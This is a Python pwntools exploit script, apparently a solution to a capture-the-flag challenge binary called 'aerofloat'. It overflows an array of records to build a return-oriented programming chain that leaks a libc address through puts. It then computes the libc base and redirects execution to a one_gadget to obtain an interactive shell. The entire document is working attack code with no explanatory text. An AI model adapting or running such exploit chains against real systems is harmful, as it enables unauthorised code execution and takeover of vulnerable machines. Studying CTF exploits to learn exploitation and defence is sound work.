from pwn import *

pop_rdi = 0x4015bb
read_got = 0x404030
call_puts = 0x401030
call_main = 0x0401192

one_gadget_offset = 0xe664b

def Addr2Float( addr ):
	return process( [ "./addr2float", str( addr ) ] ).recvline().strip()

if __name__ == "__main__":

	#p = remote( '', )
	p = process( ["./ld-linux-x86-64.so.2", "--library-path", "libs/","./aerofloat"] )
	libc = ELF( "./libc.so.6" )

	#gdb.attach( p, '''b *0x04013DE
	#	continue''' 
	#)

	p.recvuntil( ": " )
	p.send( "randomych\n" )
	p.recvuntil( "> " )

	# fill up 
	for i in range( 0, 11 ):
		p.send( "1\n" )
		p.recvuntil( ": " )
		p.send( "aaaaaaa\n" )
		p.recvuntil( ": " )
		p.send( "1337.1337\n" )
		p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p32( 0x0b ) + p32( 0x0b ) )
	p.recvuntil( ": " )
	p.send( "1337.1337\n" )
	p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p32( 0x1337 ) + p32( 0x3713 ) )
	p.recvuntil( ": " )
	p.send(  Addr2Float( pop_rdi ) + "\n" )
	p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p64( read_got ) )
	p.recvuntil( ": " )
	p.send( Addr2Float( call_puts ) + '\n' )
	p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p64( call_main ) )
	p.recvuntil( ": " )
	p.send( "0\n" )
	p.recvuntil( "4. Exit\n> " )

	# get leak
	p.send( "4\n" ) # exit 
	leak = p.recvline().strip() + '\x00'*2
	
	leak = u64( leak )
	print "leak = 0x%x" % leak

	libc_base = leak - libc.symbols[ 'read' ]
	one_gadget = libc_base + one_gadget_offset

	p.recvuntil( ": " )
	p.send( "randomych\n" )
	p.recvuntil( "> " )

	# fill up 
	for i in range( 0, 11 ):
		p.send( "1\n" )
		p.recvuntil( ": " )
		p.send( "aaaaaaa\n" )
		p.recvuntil( ": " )
		p.send( "1337.1337\n" )
		p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p32( 0x0b ) + p32( 0x0b ) )
	p.recvuntil( ": " )
	p.send( "1337.1337\n" )
	p.recvuntil( "> " )

	p.send( "1\n" )
	p.recvuntil( ": " )
	p.send( p32( 0x1337 ) + p32( 0x3713 ) )
	p.recvuntil( ": " )
	p.send(  Addr2Float( one_gadget ) + "\n" )
	p.recvuntil( "> " )

	for i in range( 0, 10 ):
		p.send( "1\n" )
		p.recvuntil( ": " )
		p.send( p64( 0 ) )
		p.recvuntil( ": " )
		p.send( "0\n" )
		p.recvuntil( "> " )

	p.send( '4\n' )

	p.interactive()
	p.close()